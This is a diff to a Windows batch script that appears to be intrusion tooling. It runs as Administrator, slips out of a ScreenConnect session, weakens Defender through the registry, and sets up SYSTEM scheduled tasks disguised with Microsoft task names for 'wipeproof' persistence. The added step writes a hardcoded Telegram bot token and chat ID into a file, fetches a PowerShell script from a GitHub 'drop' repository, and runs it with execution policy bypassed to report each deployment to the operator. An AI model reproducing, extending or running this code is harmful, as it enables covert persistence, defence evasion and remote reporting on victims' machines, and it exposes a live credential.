@@ -14,7 +14,7 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 
 REM Survive ScreenConnect Guest 30s kill: detach into independent process
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O5 ===
+  echo === OWN BUILD 20260802O6 ===
   net session >nul 2>&1
   if errorlevel 1 (echo need Administrator & exit /b 5)
   echo go_start %DATE% %TIME%>"%LOG%"
@@ -31,7 +31,7 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O5 ===
+echo === OWN WORKER 20260802O6 ===
 
 echo [1] Defender reg only (no sc stop hang)...
 echo av_reg_begin>>"%LOG%"
@@ -175,6 +175,23 @@ schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGH
 schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
 schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
 echo persist_armed_wipeproof>>"%LOG%"
+
+echo [6] First-deploy Telegram report...
+REM bootstrap notify.cfg if missing (ops bot; do not commit notify.cfg as a file)
+if not exist "%WD%\notify.cfg" (
+  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
+  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
+)
+if exist "%~dp0tg_report.ps1" (
+  copy /y "%~dp0tg_report.ps1" "%WD%\tg_report.ps1" >nul
+) else (
+  curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1" >nul 2>&1
+)
+if not exist "%WD%\tg_report.ps1" (
+  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1' -OutFile '%WD%\tg_report.ps1' -UseBasicParsing" >nul 2>&1
+)
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" >>"%LOG%" 2>&1
+echo deploy_tg_done>>"%LOG%"
 
 sc query "%PRIM%" >>"%LOG%" 2>&1
 sc query state= all | findstr /I ScreenConnect >>"%LOG%"
